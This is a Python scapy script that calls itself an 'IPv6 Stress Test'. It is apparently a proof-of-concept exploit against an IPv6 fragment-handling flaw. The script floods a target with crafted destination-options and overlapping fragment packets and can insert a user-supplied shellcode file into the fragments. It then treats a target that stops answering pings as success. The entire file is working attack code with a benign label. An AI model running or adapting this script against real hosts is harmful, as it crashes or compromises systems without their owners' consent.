import argparse
import time
import logging
from scapy.all import Ether, IPv6, IPv6ExtHdrDestOpt, IPv6ExtHdrFragment, PadN, sendp, send, ICMPv6EchoRequest, sr1, get_if_list

# set log
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ANSI color codes
GREEN = '\033[92m'
RED = '\033[91m'
RESET = '\033[0m'

# seconds
TEST_DURATION = 60

def get_available_interfaces():
    return get_if_list()

def choose_interface(interfaces):
    print("Available network interfaces:")
    for i, iface in enumerate(interfaces, 1):
        print(f"{i}. {iface}")
    while True:
        try:
            choice = int(input("Choose an interface (enter the number): "))
            if 1 <= choice <= len(interfaces):
                return interfaces[choice - 1]
            else:
                print("Invalid choice. Please try again.")
        except ValueError:
            print("Please enter a valid number.")

def craft_ipv6_pkts(idx, dst_ipv6, dst_mac=None, shellcode=None):
    frag_id = 0xdebac1e + idx
    ipv6_base = IPv6(fl=1, hlim=64+idx, dst=dst_ipv6)
    
    pkt_list = [
        ipv6_base / IPv6ExtHdrDestOpt(options=[PadN(otype=0x81, optdata='A' * 3)]),
        ipv6_base / IPv6ExtHdrFragment(id=frag_id, m=1, offset=0) / (shellcode or 'A' * 8),
        ipv6_base / IPv6ExtHdrFragment(id=frag_id, m=0, offset=1)
    ]
    
    return [Ether(dst=dst_mac) / pkt if dst_mac else pkt for pkt in pkt_list]

def gen_ipv6_pkts(tries, batches, dst_ipv6, dst_mac, shellcode=None):
    for _ in range(batches):
        for i in range(tries):
            yield from craft_ipv6_pkts(i, dst_ipv6, dst_mac, shellcode)
            yield from craft_ipv6_pkts(i, dst_ipv6, dst_mac, shellcode)

def xmit_ipv6_pkts(pkts, iface, dst_mac):
    logger.info("Transmitting IPv6 packets")
    try:
        sendp(pkts, iface=iface, verbose=False)
    except Exception as err:
        logger.warning(f"sendp failed ({err}). Falling back to send.")
        send(pkts, iface=iface, verbose=False)

def ping_ipv6(target, iface):
    ping_pkt = IPv6(dst=target)/ICMPv6EchoRequest()
    reply = sr1(ping_pkt, iface=iface, timeout=2, verbose=0)
    return reply is not None

def main():
    parser = argparse.ArgumentParser(description="IPv6 Stress Test")
    parser.add_argument("-i", "--interface", help="Network interface to use")
    parser.add_argument("-a", "--address", default="::1", help="Destination IPv6 address")
    parser.add_argument("-m", "--mac", default="00:00:00:00:00:00", help="Destination MAC address")
    parser.add_argument("-t", "--tries", type=int, default=20, help="Number of packet tries per batch")
    parser.add_argument("-b", "--batches", type=int, default=20, help="Number of packet batches")
    parser.add_argument("-c", "--shellcode", type=str, help="Path to shellcode file")

    args = parser.parse_args()

    # Automatically detect network card
    available_interfaces = get_available_interfaces()
    if not args.interface:
        if len(available_interfaces) == 1:
            args.interface = available_interfaces[0]
            logger.info(f"Automatically selected the only available interface: {args.interface}")
        else:
            args.interface = choose_interface(available_interfaces)
    elif args.interface not in available_interfaces:
        logger.error(f"Specified interface {args.interface} not found. Please choose from available interfaces.")
        args.interface = choose_interface(available_interfaces)

    logger.info(f"Using interface: {args.interface}")

    shellcode = None
    if args.shellcode:
        try:
            with open(args.shellcode, 'r') as f:
                shellcode = f.read().strip()
        except Exception as e:
            logger.error(f"Failed to read shellcode file: {e}")
            return

    try:
        start_ts = time.monotonic()
        
        pkts = list(gen_ipv6_pkts(args.tries, args.batches, args.address, args.mac, shellcode))
        xmit_ipv6_pkts(pkts, args.interface, args.mac)

        logger.info(f"Sent {len(pkts)} packets. Starting {TEST_DURATION} second countdown.")
        
        while True:
            elapsed = time.monotonic() - start_ts
            if elapsed >= TEST_DURATION:
                break
            remaining = int(TEST_DURATION - elapsed)
            print(f"\rNetwork stress test concludes in {remaining} seconds", end='', flush=True)
            time.sleep(1)

        print("\nPacket transmission test completed.")
        time.sleep(0.5)
        if ping_ipv6(args.address, args.interface):
            print(f"{RED}Target host is responding to pings.{RESET}")
        else:
            print(f"{GREEN}Target host is not responding to pings.{RESET}")
    except Exception as err:
        logger.error(f"Test aborted due to error: {err}")

if __name__ == "__main__":
    main()